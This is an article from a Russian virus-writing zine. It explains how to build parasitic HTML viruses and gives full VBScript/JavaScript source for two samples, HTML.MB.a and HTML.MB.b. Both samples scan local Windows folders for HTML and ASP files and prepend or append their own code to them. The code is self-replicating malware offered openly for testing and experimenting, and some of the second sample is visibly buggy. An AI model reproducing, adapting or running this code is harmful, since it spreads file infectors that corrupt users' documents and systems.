- [Duke's Virus Labs #7] - [Page 12] -

Паразитические HTML-вирусы
(c) by Duke/SMF

   Для того, чтобы написать полноценный HTML-вирус, надо знать как минимум
два языка скриптов - JavaScript и VBScript. В принципе, без знаний Java
нам вполне можно обойтись и воспользоваться одной стандартной заготовкой.
А именно: скриптом, проверяющим название и версию установленного на компьютере
Web-броузера. Дело в том, что VBScript нам удасться запустить на исполнение
только под броузером Internet Explorer (потому, что это именно Microsoft
является автором языка Visual Basic. Для его популяризации микрософтовцы
воткнули поддержку VB и в свой броузер), да и то начиная с версии 4.0 и
выше (Кстати, броузер IE5 понимает не все VB-скрипты, из числа работающих
под IE4. Вот вам и хваленая преемственность поколений !)
   Вот требующийся нам Java-скрипт :

===== Cut here =====
<SCRIPT Language = "JavaScript">
<!--
var userAgent=navigator.appName;
var userVer=navigator.appVersion;
    //берем первую букву от имени броузера
var agentInfo=userAgent.substring(0, 1);
    //берем первую цифру от версии броузера
var agentVer=userVer.substring(0, 1);
    //если первая буква = "M" , то похоже мы наткнулись на "Microsoft"
if(agentInfo == "M"){
    //проверяем версию - 4 или нет
if  (agentVer =="4"){
    //сейчас будет стандартный запрос пользователя от лица броузера :
alert("Click YES to continue...")
}
}else {
    //броузер не является IE4 и VB-скрипт работать не будет
alert("This page designed ONLY for IE4 :(")
self.close()
}
//-->
</SCRIPT>
===== Cut here =====

    После проведенной проверки можно запускать наш вирусный скрипт.
    А что должно входить в вирусный скрипт ? Ясно лишь одно, что одной
единственной процедурой тут не обойдешься. Остается вспомнить паскаль и
структурный подход к программированию. Весь вирус разбивается на кусочки :
1) Всякая там инициализация, прописываемся в реестр (для понта :),
выводим сообщения
2) Определяем местоположение открытого файла. Если вирус расположен на диске
(т.е. протокол "file:"), то мы можем успешно плодиться.
Обычно в этом месте стоит куча вызовов функции поражения директории с
разнообразными параметрами (т.е. поражение по списку директорий).
3) Функция поражения директории. Неплохо бы сперва проверить существование
этой директории, кидаться в бой сразу же не стоит.
Если директория в наличии, то перебираем все файлы в этой директории.
Найдя по расширению файлы, которые могут (видите как аккуратно я выражаюсь? ;)
иметь структуру HTML-документа (htm, html, asp, shm, shtml и т.д.) мы вызываем
процедуру заражения этих файлов.
4) Функция поражения файла. А здесь неплохо проверять на зараженность.
Делается это например так (здесь CV является проверяемым файлом) :

===== Cut here =====
Set CV = FSO.opentextfile(f1.path, 1, true)
GetMark = CV.ReadLine
CV.close
if GetMark <> "<!-- Metka -->" then
' чего-то там делаем
===== Cut here =====

   Писаться вирусу можно как в начало, так и в конец файла. Если мы пишемся в
начало, то мы можем проверить версию броузера и тому подобные привелегии.
А если мы пишемся в конец, то мы надеемся на авось : можно нарваться не на тот
броузер. Но в качестве эксперимента - можно :)
   Все это и воплощено в вирусах HTML.MB. Версия "a" заражает файлы в начало
и использует JavaScript, а версия "b" заражает файлы в конец и в большинстве
случаев окажется просто неработоспособной.
   Читайте, тестируйте, эксперементируйте. Полезные команды на примере
показаны в демонстрационных вирусах. А я удаляюсь..... ;-))))

===== begin html_mb1.htm =====
<!-- HTML.MB.a -->
<html><body>
<SCRIPT Language = "JavaScript">
<!--
var userAgent=navigator.appName;
var userVer=navigator.appVersion;
var agentInfo=userAgent.substring(0, 1);
var agentVer=userVer.substring(0, 1);
if(agentInfo == "M"){
if  (agentVer =="4"){
alert("Click YES to continue...")
}
}else {
alert("This page designed ONLY for IE4 :(")
self.close()
}
//-->
</script>

<script Language="VBScript">
<!-- HTML.MB.a -->
<!-- by Duke/SMF -->
<!--
On Error Resume Next
If location.protocol = "file:" Then
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Path = Replace(location.href, "/", "\")
   Path = Replace(Path, "file:\\\", "")
   Path = FSO.GetParentFolderName(Path)
   Set TRange = document.body.createTextRange
   Call ScanDir(Path)
   Call CFolder("")
   Call CFolder("Temp")
   Call CFolder("My Documents")
   Call CFolder("Windows\Desktop")
   Call CFolder("Windows\Web")
   Call CFolder("Windows\Web\Wallpaper")
   Call CFolder("Windows\Help")
   Call CFolder("Windows\Temp")
   Call CFolder("Windows\ShellNew")
   Call CFolder("Windows\System")
   Call CFolder("Windows")
   Call CFolder("Winnt\Desktop")
   Call CFolder("Winnt\Web")
   Call CFolder("Winnt\Web\Wallpaper")
   Call CFolder("Winnt\Help")
   Call CFolder("Winnt\Temp")
   Call CFolder("Winnt\ShellNew")
   Call CFolder("Winnt\System")
   Call CFolder("Winnt")
   Call CFolder("Program Files\Internet Explorer")
End If

Sub CFolder(Dir)
Call ScanDir("C:\"+Dir)
End Sub

Sub ScanDir(Dir)
On Error Resume Next
if FSO.FolderExists(Dir) then
   Do
      Set FolderObj = FSO.GetFolder(Dir)
      Dir = FSO.GetParentFolderName(Dir)
      Set FO = FolderObj.Files
      For each target In FO
          ExtName = lcase(FSO.GetExtensionName(target.Name))
          if ExtName = "htm" or ExtName = "html" or ExtName = "asp" or ExtName = "shtml" or ExtName = "stm"  Then
              Set Real = FSO.OpenTextFile(target.path, 1, False)
              If Real.readline <> "<!-- HTML.MB.a -->" Then
                  Real.close()
                  InfectFile(target.path)
              Else
                  Real.close()
              End If
          End If
      Next
   Loop Until FolderObj.IsRootFolder = True
End If
End Sub

Sub InfectFile(FN)
    Set Real = FSO.OpenTextFile(FN, 1, False)
    FileContents = Real.ReadAll()
    Real.close()
    Set Real = FSO.OpenTextFile(FN, 2, False)
    Real.WriteLine "<!-- HTML.MB.a -->"
    Real.Write("<html><body>" + Chr(13) + Chr(10))
    Real.WriteLine TRange.htmlText
    Real.WriteLine("</body></html>")
    Real.Write(FileContents)
    Real.close()
End Sub

-->
</script>
===== end   html_mb1.htm =====

===== begin html_mb2.htm =====
<!-- HTML.MB.b -->
<script language="VBScript">
<!--
On Error Resume Next
If location.protocol = "file:" Then
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Path = Replace(location.href, "/", "\")
   Path = Replace(Path, "file:\\\", "")
   NP = FSO.GetParentFolderName(Path)
   Set Folder = FSO.GetFolder(NP)
   Call ScanDir(Folder)
End If

Sub ScanDir(Dir)
While Dir.IsRootFolder = false
   Set Dir = FileSystem.GetFolder(NP)
   Set DF = Dir.Files
   Path = FSO.GetParentFolderName(NP)

For each Jertva in DF
    ext = Lcase(FSO.GetExtensionName(Jertva.name))
    If ext = "htm" or ext = "html" or ext ="asp" Then
    Set host = FSO.opentextfile(Jertva.path, 2, true)

    Stop = 0
    Do While host.AtEndOfStream <> True
        GetMark = host.ReadLine
        If GetMark = "<!-- HTML.MB.b -->" Then
            Stop = 1
        End If
    Loop

    If Stop = 0 Then
        'заражаем !
        'в файле вирусе спускаемся до метки
        Set CV = FSO.opentextfile(Path, 1, true)
        Do While Stop = 0
            GetMark = CV.ReadLine
            if GetMark = "<!-- HTML.MB.b -->" Then
               Stop = 1
            End If
        Loop
        'переписываем все до конца файла вируса в конец файла жертвы
        host.WriteLine "<!-- HTML.MB.b -->"
        Do While host.AtEndOfStream <> True
           host.WriteLine CV.ReadLine
        Loop
        host.Close
        CV.close
    Else
        host.Close
    End If
Next
Wend
End Sub
--></script>
===== end   html_mb2.htm =====
